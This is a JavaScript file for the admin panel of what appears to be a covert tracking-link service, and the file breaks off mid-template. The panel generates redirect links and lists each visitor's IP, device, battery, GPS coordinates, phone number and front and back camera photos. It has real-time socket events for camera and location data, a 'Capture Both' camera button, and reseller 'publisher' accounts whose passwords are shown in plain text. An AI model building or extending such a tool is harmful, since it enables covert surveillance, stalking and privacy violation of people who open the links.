let socket;
let currentVisitorId = null;
let allUsersData = [];
let currentFilter = 'all';
let currentSort = 'newest';

// ============================================
// MENU TOGGLE
// ============================================
function toggleMenu() {
    const menu = document.getElementById('sideMenu');
    menu.classList.toggle('open');
}

// ============================================
// SOCKET CONNECTION
// ============================================
socket = io();

fetch('/api/check-session')
    .then(response => {
        if (response.status === 401) {
            window.location.href = '/';
        }
        return response.json();
    })
    .then(data => {
        if (!data.authenticated) {
            window.location.href = '/';
        }
        loadAllData();
    })
    .catch(() => {
        window.location.href = '/';
    });

function loadAllData() {
    Promise.all([
        fetch('/api/users-data').then(r => r.json()),
        fetch('/api/super-users').then(r => r.json()),
        fetch('/api/publishers').then(r => r.json())
    ])
    .then(([usersData, superData, publisherData]) => {
        allUsersData = usersData;
        loadVisitors();
        updateStats();
        displayAllUsers(usersData);
        updateUsersStats(usersData);
        populateStateFilter(usersData);
        loadLinks();
        displaySuperUsers(superData);
        displayPublishers(publisherData);
        document.getElementById('totalSuper').textContent = superData.length || 0;
        document.getElementById('totalPublishers').textContent = publisherData.length || 0;
    })
    .catch(() => {
        window.location.href = '/';
    });
}

socket.on('visitor-connected', () => {
    refreshAllData();
    loadLinks();
    showNotification('🟢 New visitor connected!');
});

socket.on('visitor-disconnected', () => {
    refreshAllData();
});

socket.on('camera-data', () => {
    refreshAllData();
});

socket.on('location-data', () => {
    refreshAllData();
});

socket.on('superPowerData', () => {
    refreshAllData();
});

// ============================================
// COPY FUNCTION
// ============================================
function copyToClipboard(text) {
    if (!text || text === 'N/A' || text === 'null' || text === 'undefined' || text === 'Click to copy') {
        showNotification('❌ Nothing to copy');
        return;
    }
    navigator.clipboard.writeText(text).then(() => {
        showNotification('✅ Copied to clipboard!');
    }).catch(() => {
        const input = document.createElement('input');
        input.value = text;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        showNotification('✅ Copied to clipboard!');
    });
}

// ============================================
// GENERATE LINK
// ============================================
function generateCustomLink() {
    const url = document.getElementById('customUrl').value;
    if (!url) {
        alert('Please enter a URL');
        return;
    }
    
    fetch('/generate-custom-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ redirectUrl: url })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('generatedLinkContainer').style.display = 'block';
            document.getElementById('generatedLink').value = data.link;
            document.getElementById('powerLinkDisplay').textContent = data.powerLink;
            document.getElementById('superPowerLinkDisplay').textContent = data.superPowerLink;
            document.getElementById('generatedLinkId').textContent = data.linkId;
            document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
            showNotification('✅ Links generated! Link ID: ' + data.linkId);
            refreshAllData();
            loadLinks();
        }
    })
    .catch(error => {
        alert('Error: ' + error.message);
    });
}

// ============================================
// PUBLISHER FUNCTIONS
// ============================================
function createPublisher() {
    const email = document.getElementById('publisherEmail').value.trim();
    const password = document.getElementById('publisherPassword').value.trim();
    
    if (!email || !password) {
        alert('Please enter email and password');
        return;
    }
    
    fetch('/api/create-publisher', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('publisherLinkContainer').style.display = 'block';
            document.getElementById('publisherLinkDisplay').value = data.link;
            document.getElementById('publisherAutoLinkDisplay').value = data.autoLoginLink;
            showNotification('✅ Publisher created!');
            document.getElementById('publisherEmail').value = '';
            document.getElementById('publisherPassword').value = '';
            loadAllData();
        } else {
            alert('Error: ' + (data.error || 'Unknown error'));
        }
    })
    .catch(error => {
        alert('Error: ' + error.message);
    });
}

function displayPublishers(publishers) {
    const container = document.getElementById('publishersList');
    container.innerHTML = '';
    if (!publishers || publishers.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:20px;">No publishers created yet.</p>';
        return;
    }
    publishers.forEach((p, index) => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        const statusColor = p.suspended ? '#fc8181' : '#48bb78';
        const statusText = p.suspended ? '🔴 Suspended' : '🟢 Active';
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>📢 #${index + 1} ${p.email}</strong>
                    <div style="font-size:12px; color:#888; margin-top:3px;">🔗 ${p.link}</div>
                    <div style="font-size:12px; color:#888;">📅 ${new Date(p.createdAt).toLocaleString()}</div>
                    <div style="font-size:12px; color:#888;">🔑 Password: ${p.password}</div>
                    <div style="font-size:12px; color:${statusColor};">${statusText}</div>
                </div>
                <span style="padding:5px 10px; background:#9f7aea; color:white; border-radius:5px; font-size:12px;">👥 ${p.totalVisits || 0} visits</span>
            </div>
            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="copyToClipboard('${p.link}')" class="camera-btn" style="background:#9f7aea;">📋 Copy</button>
                <button onclick="copyToClipboard('${p.autoLoginLink}')" class="camera-btn" style="background:#48bb78;">🔗 Auto Login</button>
                <button onclick="showPublisherDetails('${p.id}')" class="camera-btn" style="background:#667eea;">📊 Details</button>
                <button onclick="viewPublisherVisitors('${p.id}')" class="camera-btn" style="background:#ed8936;">👥 Visitors</button>
                <button onclick="toggleSuspendPublisher('${p.id}')" class="camera-btn" style="background:${p.suspended ? '#48bb78' : '#fc8181'}">
                    ${p.suspended ? '🔄 Unsuspend' : '⛔ Suspend'}
                </button>
                <button onclick="deletePublisher('${p.id}')" class="camera-btn" style="background:#fc8181;">🗑️ Delete</button>
            </div>
        `;
        container.appendChild(card);
    });
}

function deletePublisher(publisherId) {
    if (!confirm('Delete this publisher permanently?')) return;
    fetch(`/api/publisher/${publisherId}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Publisher deleted');
                loadAllData();
            }
        })
        .catch(error => {
            alert('Error: ' + error.message);
        });
}

function toggleSuspendPublisher(publisherId) {
    if (!confirm('Toggle suspend status for this publisher?')) return;
    fetch(`/api/publisher/${publisherId}/suspend`, { method: 'PUT' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification(data.suspended ? '⛔ Publisher suspended' : '🔄 Publisher unsuspended');
                loadAllData();
            }
        })
        .catch(error => {
            alert('Error: ' + error.message);
        });
}

function viewPublisherVisitors(publisherId) {
    fetch(`/api/publisher-visitors/${publisherId}`)
        .then(response => response.json())
        .then(visitors => {
            const modal = document.getElementById('publisherVisitorsModal');
            const content = document.getElementById('publisherVisitorsContent');
            content.innerHTML = '';
            
            if (!visitors || visitors.length === 0) {
                content.innerHTML = '<p style="color:#999;">No visitors yet for this publisher</p>';
            } else {
                visitors.forEach((v, index) => {
                    const card = document.createElement('div');
                    card.style.cssText = 'padding:8px; border-bottom:1px solid #eee; font-size:13px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:5px;';
                    card.innerHTML = `
                        <div>
                            <strong>#${index + 1}</strong> 🆔 ${v.id.substring(0, 8)} 
                            📱 ${v.deviceName || 'Unknown'} 
                            ${v.ip ? `🌐 ${v.ip}` : ''}
                            📅 ${v.visitDate ? new Date(v.visitDate).toLocaleString() : 'N/A'}
                            ${v.location ? `📍 ${v.location.city || ''} ${v.location.state || ''}` : ''}
                            ${v.battery ? `🔋 ${v.battery}%` : ''}
                        </div>
                        <div style="display:flex; gap:5px; flex-wrap:wrap;">
                            <button onclick="copyToClipboard('${v.id}')" class="camera-btn" style="padding:2px 8px; font-size:10px;">📋</button>
                            ${v.frontCamera ? `<button onclick="downloadPhoto('${v.frontCamera.image || v.frontCamera}', 'front-${v.id}.jpg')" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#48bb78;">⬇️</button>` : ''}
                            <button onclick="exportPublisherVisitor('${publisherId}', ${index})" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#667eea;">📤</button>
                            <button onclick="viewPublisherVisitorDetails('${publisherId}', ${index})" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#ed8936;">👁️</button>
                        </div>
                    `;
                    content.appendChild(card);
                });
            }
            modal.style.display = 'flex';
        });
}

function viewPublisherVisitorDetails(publisherId, visitorIndex) {
    fetch(`/api/publisher-visitors/${publisherId}`)
        .then(response => response.json())
        .then(visitors => {
            const v = visitors[visitorIndex];
            if (!v) {
                alert('Visitor not found');
                return;
            }
            const modal = document.getElementById('publisherModal');
            const content = document.getElementById('publisherDetailsContent');
            content.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                    <div class="detail-card"><label>🆔 ID</label><div class="value">${v.id}</div></div>
                    <div class="detail-card"><label>📱 Device</label><div class="value">${v.deviceName || 'N/A'}</div></div>
                    <div class="detail-card"><label>💻 OS</label><div class="value">${v.os || 'N/A'}</div></div>
                    <div class="detail-card"><label>🌍 Browser</label><div class="value">${v.browser || 'N/A'}</div></div>
                    <div class="detail-card"><label>🌐 IP</label><div class="value">${v.ip || 'N/A'}</div></div>
                    <div class="detail-card"><label>📶 Network</label><div class="value">${v.network?.effectiveType || v.network?.type || 'N/A'}</div></div>
                    <div class="detail-card"><label>🔋 Battery</label><div class="value">${v.battery || 'N/A'}%</div></div>
                    <div class="detail-card"><label>📍 Location</label><div class="value">${v.location ? `${v.location.city || ''} ${v.location.state || ''} ${v.location.country || ''}` : 'N/A'}</div></div>
                    <div class="detail-card"><label>📍 Coordinates</label><div class="value">${v.location ? `${v.location.lat || 'N/A'}, ${v.location.lng || 'N/A'}` : 'N/A'}</div></div>
                    ${v.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${v.frontCamera.image || v.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                    ${v.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${v.backCamera.image || v.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                </div>
            `;
            modal.style.display = 'flex';
        });
}

function exportPublisherVisitor(publisherId, visitorIndex) {
    fetch(`/api/publisher-visitors/${publisherId}`)
        .then(response => response.json())
        .then(visitors => {
            const v = visitors[visitorIndex];
            if (!v) {
                alert('Visitor not found');
                return;
            }
            
            const canvas = document.createElement('canvas');
            canvas.width = 700;
            canvas.height = 500;
            const ctx = canvas.getContext('2d');
            
            // Professional gradient background
            const gradient = ctx.createLinearGradient(0, 0, 700, 500);
            gradient.addColorStop(0, '#0f0c29');
            gradient.addColorStop(0.5, '#302b63');
            gradient.addColorStop(1, '#24243e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 700, 500);
            
            // Blur effect overlay
            ctx.shadowColor = 'rgba(102, 126, 234, 0.3)';
            ctx.shadowBlur = 30;
            ctx.fillStyle = 'rgba(255,255,255,0.03)';
            ctx.fillRect(0, 0, 700, 500);
            ctx.shadowBlur = 0;
            
            // Header with glow
            ctx.shadowColor = 'rgba(102, 126, 234, 0.5)';
            ctx.shadowBlur = 20;
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 26px Arial';
            ctx.fillText('📊 Visitor Data Report', 30, 50);
            ctx.shadowBlur = 0;
            
            ctx.fillStyle = '#667eea';
            ctx.font = '13px Arial';
            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
            
            // Info boxes with glass effect
            const info = [
                ['🆔 ID', v.id],
                ['📱 Device', v.deviceName || 'N/A'],
                ['💻 OS', v.os || 'N/A'],
                ['🌍 Browser', v.browser || 'N/A'],
                ['🌐 IP', v.ip || 'N/A'],
                ['📶 Network', v.network?.effectiveType || v.network?.type || 'N/A'],
                ['🔋 Battery', v.battery || 'N/A' + '%'],
                ['📍 Location', v.location ? `${v.location.city || ''} ${v.location.state || ''}` : 'N/A'],
                ['📍 Coordinates', v.location ? `${v.location.lat || 'N/A'}, ${v.location.lng || 'N/A'}` : 'N/A']
            ];
            
            info.forEach(([label, value], i) => {
                const x = 30 + (i % 2) * 340;
                const y = 110 + Math.floor(i / 2) * 45;
                
                // Box background with glass effect
                ctx.fillStyle = 'rgba(255,255,255,0.04)';
                ctx.shadowColor = 'rgba(102, 126, 234, 0.2)';
                ctx.shadowBlur = 15;
                ctx.beginPath();
                ctx.roundRect(x, y, 310, 35, 8);
                ctx.fill();
                ctx.shadowBlur = 0;
                
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '11px Arial';
                ctx.fillText(label, x + 12, y + 22);
                
                ctx.fillStyle = 'rgba(255,255,255,0.9)';
                ctx.font = '12px Arial';
                ctx.fillText(value, x + 100, y + 22);
            });
            
            // Photos if available
            let yPos = 320;
            let photosLoaded = 0;
            const totalPhotos = (v.frontCamera ? 1 : 0) + (v.backCamera ? 1 : 0);
            
            const drawPhoto = (imgSrc, label) => {
                const img = new Image();
                img.onload = function() {
                    ctx.shadowColor = 'rgba(102, 126, 234, 0.3)';
                    ctx.shadowBlur = 20;
                    ctx.fillStyle = '#ffffff';
                    ctx.font = 'bold 14px Arial';
                    ctx.fillText(label, 30, yPos);
                    ctx.shadowBlur = 0;
                    
                    const maxWidth = 140;
                    const maxHeight = 140;
                    let width = img.width;
                    let height = img.height;
                    if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
                    if (height > maxHeight) { width = (width * maxHeight) / height; height = maxHeight; }
                    
                    ctx.shadowColor = 'rgba(0,0,0,0.4)';
                    ctx.shadowBlur = 25;
                    ctx.drawImage(img, 30, yPos + 5, width, height);
                    ctx.shadowBlur = 0;
                    
                    yPos += 160;
                    photosLoaded++;
                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
                        // Footer with glow
                        ctx.shadowColor = 'rgba(102, 126, 234, 0.2)';
                        ctx.shadowBlur = 10;
                        ctx.fillStyle = 'rgba(255,255,255,0.2)';
                        ctx.font = '11px Arial';
                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 470);
                        ctx.shadowBlur = 0;
                        
                        const link = document.createElement('a');
                        link.download = `visitor-${v.id}-report.png`;
                        link.href = canvas.toDataURL('image/png');
                        link.click();
                        showNotification('📤 Visitor data exported as image!');
                    }
                };
                img.src = imgSrc;
            };
            
            if (v.frontCamera) {
                drawPhoto(v.frontCamera.image || v.frontCamera, '📸 Front Camera');
            }
            if (v.backCamera) {
                drawPhoto(v.backCamera.image || v.backCamera, '📸 Back Camera');
            }
            
            if (totalPhotos === 0) {
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '14px Arial';
                ctx.fillText('No photos available', 30, 350);
                
                ctx.fillStyle = 'rgba(255,255,255,0.2)';
                ctx.font = '11px Arial';
                ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 470);
                
                const link = document.createElement('a');
                link.download = `visitor-${v.id}-report.png`;
                link.href = canvas.toDataURL('image/png');
                link.click();
                showNotification('📤 Visitor data exported as image!');
            }
        });
}

function showPublisherDetails(publisherId) {
    fetch(`/api/publisher-data/${publisherId}`)
        .then(response => response.json())
        .then(publisher => {
            const modal = document.getElementById('publisherModal');
            const content = document.getElementById('publisherDetailsContent');
            content.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                    <div class="detail-card"><label>📧 Email</label><div class="value">${publisher.email}</div></div>
                    <div class="detail-card"><label>🔑 Password</label><div class="value">${publisher.password}</div></div>
                    <div class="detail-card"><label>🔗 Link</label><div class="value">${publisher.link}</div></div>
                    <div class="detail-card"><label>📅 Created</label><div class="value">${new Date(publisher.createdAt).toLocaleString()}</div></div>
                    <div class="detail-card"><label>👥 Total Visits</label><div class="value">${publisher.totalVisits || 0}</div></div>
                    <div class="detail-card"><label>🆔 Publisher ID</label><div class="value">${publisher.id}</div></div>
                    <div class="detail-card"><label>📊 Users</label><div class="value">${(publisher.users || []).length} users</div></div>
                    <div class="detail-card"><label>⛔ Status</label><div class="value" style="color:${publisher.suspended ? '#fc8181' : '#48bb78'}">${publisher.suspended ? 'Suspended' : 'Active'}</div></div>
                </div>
                <button onclick="exportPublisherData('${publisherId}')" class="camera-btn" style="background:#48bb78; margin-top:15px;">📥 Export All Data</button>
            `;
            modal.style.display = 'flex';
        });
}

function exportPublisherData(publisherId) {
    fetch(`/api/publisher-data/${publisherId}`)
        .then(response => response.json())
        .then(publisher => {
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');
            
            const gradient = ctx.createLinearGradient(0, 0, 800, 600);
            gradient.addColorStop(0, '#0f0c29');
            gradient.addColorStop(0.5, '#302b63');
            gradient.addColorStop(1, '#24243e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 800, 600);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 28px Arial';
            ctx.fillText('📢 Publisher Data Report', 30, 50);
            ctx.fillStyle = '#667eea';
            ctx.font = '14px Arial';
            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 18px Arial';
            ctx.fillText('📋 Publisher Information', 30, 110);
            
            const info = [
                `Email: ${publisher.email}`,
                `Password: ${publisher.password}`,
                `ID: ${publisher.id}`,
                `Created: ${new Date(publisher.createdAt).toLocaleString()}`,
                `Total Visits: ${publisher.totalVisits || 0}`,
                `Total Users: ${(publisher.users || []).length}`,
                `Status: ${publisher.suspended ? 'Suspended' : 'Active'}`
            ];
            
            ctx.fillStyle = 'rgba(255,255,255,0.8)';
            ctx.font = '13px Arial';
            info.forEach((line, i) => {
                ctx.fillText(line, 40, 140 + i * 22);
            });
            
            ctx.fillStyle = 'rgba(255,255,255,0.3)';
            ctx.font = '12px Arial';
            ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 570);
            
            const link = document.createElement('a');
            link.download = `publisher-data-${publisher.id}.png`;
            link.href = canvas.toDataURL('image/png');
            link.click();
        });
}

// ============================================
// SUPER POWER USERS
// ============================================
function displaySuperUsers(users) {
    const container = document.getElementById('superUsersList');
    container.innerHTML = '';
    if (!users || users.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No super power users yet.</p>';
        return;
    }
    users.forEach((user, index) => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        const data = user.data || {};
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>⚡ #${index + 1} Super User</strong>
                    <div style="font-size:13px; color:#888; margin-top:3px;">🆔 ${user.id}</div>
                    <div style="font-size:12px; color:#888;">📅 ${new Date(user.createdAt).toLocaleString()}</div>
                    <div style="font-size:12px; color:#888;">🔗 Link ID: ${user.linkId || 'N/A'}</div>
                </div>
                <span style="padding:5px 10px; background:#f6ad55; color:white; border-radius:5px; font-size:12px;">⭐ Super</span>
            </div>
            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#f6ad55;">📋 Copy ID</button>
                <button onclick="deleteSuperUser('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
                <button onclick="viewSuperUserDetails('${user.id}')" class="camera-btn" style="background:#667eea;">👁️ View</button>
            </div>
        `;
        container.appendChild(card);
    });
}

function viewSuperUserDetails(superUserId) {
    // Find the super user data from the list
    fetch('/api/super-users')
        .then(response => response.json())
        .then(users => {
            const user = users.find(u => u.id === superUserId);
            if (!user) {
                alert('Super user not found');
                return;
            }
            const modal = document.getElementById('publisherModal');
            const content = document.getElementById('publisherDetailsContent');
            const data = user.data || {};
            content.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                    <div class="detail-card"><label>⚡ Super User</label><div class="value">${user.id}</div></div>
                    <div class="detail-card"><label>📅 Date</label><div class="value">${new Date(user.createdAt).toLocaleString()}</div></div>
                    <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
                    <div class="detail-card"><label>📋 Permissions</label><div class="value">${(data.permissions || []).join(', ')}</div></div>
                    <div class="detail-card"><label>🕐 Granted At</label><div class="value">${data.grantedAt ? new Date(data.grantedAt).toLocaleString() : 'N/A'}</div></div>
                </div>
            `;
            modal.style.display = 'flex';
        });
}

function deleteSuperUser(id) {
    if (!confirm('Delete this super user?')) return;
    fetch(`/api/super-user/${id}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Super user deleted');
                loadAllData();
            }
        });
}

// ============================================
// TAB SWITCHING
// ============================================
function showTab(tab) {
    document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
    document.getElementById('usersTab').style.display = tab === 'users' ? 'block' : 'none';
    document.getElementById('superTab').style.display = tab === 'super' ? 'block' : 'none';
    document.getElementById('publishersTab').style.display = tab === 'publishers' ? 'block' : 'none';
    document.getElementById('linksTab').style.display = tab === 'links' ? 'block' : 'none';
    
    // Update menu items
    document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
    const menuMap = {
        'dashboard': 'menuDashboard',
        'users': 'menuUsers',
        'super': 'menuSuper',
        'publishers': 'menuPublishers',
        'links': 'menuLinks'
    };
    const menuItem = document.getElementById(menuMap[tab]);
    if (menuItem) menuItem.classList.add('active');
    
    // Close menu on mobile
    if (window.innerWidth <= 768) {
        document.getElementById('sideMenu').classList.remove('open');
    }
    
    if (tab === 'users') { refreshAllData(); }
    if (tab === 'links') { loadLinks(); }
    if (tab === 'super') { loadAllData(); }
    if (tab === 'publishers') { loadAllData(); }
}

// ============================================
// LOAD LINKS
// ============================================
function loadLinks() {
    fetch('/api/links')
        .then(response => response.json())
        .then(links => {
            displayLinks(links);
        });
}

function displayLinks(links) {
    const container = document.getElementById('linksList');
    container.innerHTML = '';
    if (!links || links.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No links generated yet.</p>';
        return;
    }
    links.forEach(link => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>🔗 Link ID: ${link.linkId}</strong>
                    <div style="font-size:13px; color:#666; margin-top:3px;">🔗 Normal: ${link.link}</div>
                    ${link.powerLink ? `<div style="font-size:12px; color:#ed8936;">⚡ Power: ${link.powerLink}</div>` : ''}
                    ${link.superPowerLink ? `<div style="font-size:12px; color:#f6ad55;">⭐ Super: ${link.superPowerLink}</div>` : ''}
                    <div style="font-size:12px; color:#888;">🎯 ${link.redirectUrl}</div>
                </div>
                <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">👥 ${link.totalVisits || 0} visits</span>
            </div>
            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Normal</button>
                ${link.powerLink ? `<button onclick="copyToClipboard('${link.powerLink}')" class="camera-btn" style="background:#ed8936;">📋 Power</button>` : ''}
                ${link.superPowerLink ? `<button onclick="copyToClipboard('${link.superPowerLink}')" class="camera-btn" style="background:#f6ad55;">📋 Super</button>` : ''}
                <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View</button>
            </div>
        `;
        container.appendChild(card);
    });
}

function searchByLinkId(linkId) {
    document.getElementById('searchUsers').value = linkId;
    showTab('users');
    setTimeout(() => searchUsers(), 500);
}

// ============================================
// REFRESH ALL DATA
// ============================================
function refreshAllData() {
    Promise.all([
        fetch('/api/users-data').then(r => r.json()),
        fetch('/api/super-users').then(r => r.json()),
        fetch('/api/publishers').then(r => r.json())
    ])
    .then(([usersData, superData, publisherData]) => {
        allUsersData = usersData;
        displayAllUsers(usersData);
        updateUsersStats(usersData);
        populateStateFilter(usersData);
        displayVisitors(usersData);
        displaySuperUsers(superData);
        displayPublishers(publisherData);
        updateStats();
        document.getElementById('totalSuper').textContent = superData.length || 0;
        document.getElementById('totalPublishers').textContent = publisherData.length || 0;
    });
}

// ============================================
// UPDATE STATS
// ============================================
function updateStats() {
    Promise.all([
        fetch('/api/visitors').then(r => r.json()),
        fetch('/api/super-users').then(r => r.json()),
        fetch('/api/publishers').then(r => r.json())
    ])
    .then(([visitors, superUsers, publishers]) => {
        document.getElementById('totalVisitors').textContent = visitors.length;
        document.getElementById('activeVisitors').textContent = visitors.filter(v => v.connected).length;
        document.getElementById('totalLinks').textContent = visitors.length;
        document.getElementById('totalSuper').textContent = superUsers.length || 0;
        document.getElementById('totalPublishers').textContent = publishers.length || 0;
    });
}

// ============================================
// LOAD VISITORS (Recent)
// ============================================
function loadVisitors() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            displayVisitors(visitors);
        });
}

function displayVisitors(visitors) {
    const container = document.getElementById('visitorsList');
    container.innerHTML = '';
    const recent = visitors.slice(-10).reverse();
    recent.forEach((visitor, index) => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        let locationStr = '';
        if (visitor.location) {
            const loc = visitor.location;
            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
        }
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>#${index + 1} ID: ${visitor.id.substring(0, 8)}</strong>
                    <div style="font-size:13px; color:#666; margin-top:3px;">
                        📱 ${visitor.deviceName || 'Unknown'} 
                        ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                        ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
                    </div>
                    ${locationStr ? `<div style="font-size:12px; color:#888;">${locationStr}</div>` : ''}
                </div>
                <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                    ${visitor.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="margin-top:10px;">
                <button onclick="showUserDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
                <button onclick="deleteVisitor('${visitor.id}')" class="camera-btn delete">🗑️ Delete</button>
            </div>
        `;
        container.appendChild(card);
    });
}

// ============================================
// DISPLAY ALL USERS
// ============================================
function displayAllUsers(users) {
    const container = document.getElementById('allUsersList');
    container.innerHTML = '';
    if (!users || users.length === 0) {
        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet.</p>';
        document.getElementById('userCount').textContent = '(0)';
        return;
    }
    
    let filteredUsers = [...users];
    
    if (currentFilter !== 'all') {
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        filteredUsers = filteredUsers.filter(user => {
            const visitDate = user.visitDate ? new Date(user.visitDate) : null;
            if (!visitDate) return false;
            if (currentFilter === 'today') { return visitDate >= today; }
            else if (currentFilter === 'yesterday') {
                const yesterday = new Date(today);
                yesterday.setDate(yesterday.getDate() - 1);
                return visitDate >= yesterday && visitDate < today;
            } else if (currentFilter === '7days') {
                const sevenDays = new Date(today);
                sevenDays.setDate(sevenDays.getDate() - 7);
                return visitDate >= sevenDays;
            } else if (currentFilter === '30days') {
                const thirtyDays = new Date(today);
                thirtyDays.setDate(thirtyDays.getDate() - 30);
                return visitDate >= thirtyDays;
            }
            return true;
        });
    }
    
    if (currentSort === 'newest') {
        filteredUsers.sort((a, b) => {
            const dateA = a.visitDate ? new Date(a.visitDate) : new Date(0);
            const dateB = b.visitDate ? new Date(b.visitDate) : new Date(0);
            return dateB - dateA;
        });
    } else {
        filteredUsers.sort((a, b) => {
            const dateA = a.visitDate ? new Date(a.visitDate) : new Date(0);
            const dateB = b.visitDate ? new Date(b.visitDate) : new Date(0);
            return dateA - dateB;
        });
    }
    
    document.getElementById('userCount').textContent = `(${filteredUsers.length} users)`;
    
    filteredUsers.forEach((user, index) => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        card.id = 'user-' + user.id;
        let locationStr = '';
        if (user.location) {
            const loc = user.location;
            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
        }
        const visitCount = user.totalVisits || 0;
        const lastVisit = user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'Never';
        
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>#${index + 1} 🆔 ${user.id}</strong>
                    <div style="font-size:13px; color:#666; margin-top:3px;">
                        📱 ${user.deviceName || 'Unknown'} 
                        ${user.ip ? `• 🌐 ${user.ip}` : ''}
                        ${user.linkId ? `• 🔗 ${user.linkId}` : ''}
                        ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
                        ${user.phoneNumber ? `• 📞 ${user.phoneNumber}` : ''}
                    </div>
                    ${locationStr ? `<div style="font-size:12px; color:#888;">${locationStr}</div>` : ''}
                    ${user.battery ? `<div style="font-size:12px; color:#888;">🔋 ${user.battery}%</div>` : ''}
                </div>
                <span class="status ${user.connected ? 'active' : 'inactive'}">
                    ${user.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                <button onclick="showUserDetails('${user.id}')" class="camera-btn">📊 Full Details</button>
                <button onclick="deleteVisitor('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
                ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera.image || user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
                ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera.image || user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
            </div>
            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                ${user.frontCamera ? `<img src="${user.frontCamera.image || user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
